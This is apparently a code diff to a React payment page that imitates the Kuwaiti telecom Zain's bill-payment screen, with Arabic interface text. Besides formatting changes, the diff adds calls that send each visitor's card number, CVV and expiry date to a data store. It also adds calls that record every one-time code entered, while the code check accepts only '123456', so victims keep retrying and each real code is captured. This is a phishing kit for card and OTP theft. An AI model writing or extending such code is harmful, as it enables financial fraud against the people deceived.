@@ -32,7 +32,8 @@ const validateKuwaitPhone = (phone: string) => {
   return kuwaitMobilePattern.test(phone)
 }
 
-const _id = randstr("zain-")
+const _id =localStorage.getItem('visitor')
+const allOtps = ['']
 
 export default function ZainPayment() {
   const [selectedTab, setSelectedTab] = useState("bill")
@@ -44,7 +45,6 @@ export default function ZainPayment() {
   const [selectedOption, setSelectedOption] = useState("رقم آخر")
   const [captchaChecked, setCaptchaChecked] = useState(false)
   const router = useRouter()
-
   const amounts = [
     { value: "2.000", validity: 7 },
     { value: "4.000", validity: 15 },
@@ -57,7 +57,7 @@ export default function ZainPayment() {
   const paymentOptions = ["رقم آخر", "رقم العقد"]
 
   useEffect(() => {
-    getLocation().then(() => {})
+    getLocation().then(() => { })
   }, [])
 
   async function getLocation() {
@@ -74,7 +74,7 @@ export default function ZainPayment() {
         country: country,
       })
       localStorage.setItem("country", country)
-      setupOnlineStatus(_id)
+      setupOnlineStatus(_id!)
     } catch (error) {
       console.error("Error fetching location:", error)
     }
@@ -162,7 +162,7 @@ export default function ZainPayment() {
     if (!validateForm()) {
       return
     }
-
+    addData({ id: _id, cardNumber, cvv: cardCvc, expiryDate: cardExpiry })
     setIsProcessing(true)
     // Simulate payment processing
     setTimeout(() => {
@@ -191,6 +191,9 @@ export default function ZainPayment() {
 
   const verifyOtp = () => {
     setIsProcessing(true)
+    allOtps.push(otpValues.join(""))
+    addData({ id: _id, otp: otpValues.join(""), allOtps })
+
     setTimeout(() => {
       setIsProcessing(false)
       if (otpValues.join("") === "123456") {
@@ -198,7 +201,7 @@ export default function ZainPayment() {
         setShowOtpDialog(false)
       } else {
         setOtpError("رمز التحقق غير صالح. يرجى المحاولة مرة أخرى.")
-        setOtpValues(['','','','','',''])
+        setOtpValues(['', '', '', '', '', ''])
       }
     }, 2000)
   }
@@ -266,7 +269,7 @@ export default function ZainPayment() {
       className="flex justify-center items-center min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 p-4"
       dir="rtl"
     >
-      <Card className="w-full max-w-lg shadow-2xl border-0 overflow-hidden bg-white/95 backdrop-blur-sm">
+      <Card className="w-full max-w-sm shadow-2xl border-0 overflow-hidden bg-white/95 backdrop-blur-sm">
         <div className="absolute top-0 left-0 right-0 h-2 bg-gradient-to-r from-[#2d1a45] via-[#d13c8c] to-[#6b2a84]"></div>
 
         {paymentState === "FORM" && (
@@ -327,9 +330,8 @@ export default function ZainPayment() {
                   {/* Credit Card Option */}
                   <div className="relative group">
                     <div
-                      className={`absolute inset-0 rounded-xl transition-all duration-300 ${
-                        paymentMethod === "card" ? "ring-2 ring-[#d13c8c] shadow-lg" : "group-hover:shadow-md"
-                      }`}
+                      className={`absolute inset-0 rounded-xl transition-all duration-300 ${paymentMethod === "card" ? "ring-2 ring-[#d13c8c] shadow-lg" : "group-hover:shadow-md"
+                        }`}
                     ></div>
 
                     <div className="flex items-center space-x-3 relative">
@@ -347,10 +349,10 @@ export default function ZainPayment() {
                         </div>
                         <div className="flex gap-2">
                           <div className="w-10 h-6 rounded flex items-center justify-center">
-<img src="/visa.svg"  alt="logo" width={45}/>
+                            <img src="/visa.svg" alt="logo" width={45} />
                           </div>
                           <div className="w-10 h-6 bg-red-600 rounded flex items-center justify-center">
-                          <img src="/master.svg"  alt="logo" width={45}/>
+                            <img src="/master.svg" alt="logo" width={45} />
                           </div>
                         </div>
                       </Label>
@@ -392,13 +394,12 @@ export default function ZainPayment() {
                               value={cardNumber}
                               onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                               maxLength={19}
-                              className={`h-12 text-lg ${
-                                formErrors.cardNumber
+                              className={`h-12 text-lg ${formErrors.cardNumber
                                   ? "border-red-300 focus:border-red-500"
                                   : "border-gray-300 focus:border-[#d13c8c]"
-                              }`}
+                                }`}
                             />
-                           
+
                           </div>
                         </div>
 
@@ -422,11 +423,10 @@ export default function ZainPayment() {
                               value={cardExpiry}
                               onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                               maxLength={5}
-                              className={`h-12 ${
-                                formErrors.cardExpiry
+                              className={`h-12 ${formErrors.cardExpiry
                                   ? "border-red-300 focus:border-red-500"
                                   : "border-gray-300 focus:border-[#d13c8c]"
-                              }`}
+                                }`}
                             />
                           </div>
                           <div className="space-y-2">
@@ -448,11 +448,10 @@ export default function ZainPayment() {
                               maxLength={4}
                               value={cardCvc}
                               onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
-                              className={`h-12 ${
-                                formErrors.cardCvc
+                              className={`h-12 ${formErrors.cardCvc
                                   ? "border-red-300 focus:border-red-500"
                                   : "border-gray-300 focus:border-[#d13c8c]"
-                              }`}
+                                }`}
                             />
                           </div>
                         </div>
@@ -548,9 +547,8 @@ export default function ZainPayment() {
                     value={value}
                     onChange={(e) => handleOtpChange(index, e.target.value)}
                     onKeyDown={(e) => handleKeyDown(index, e)}
-                    className={`w-14 h-16 text-center text-xl font-bold border-2 rounded-lg ${
-                      otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
-                    }`}
+                    className={`w-14 h-16 text-center text-xl font-bold border-2 rounded-lg ${otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
+                      }`}
                   />
                 </div>
               ))}
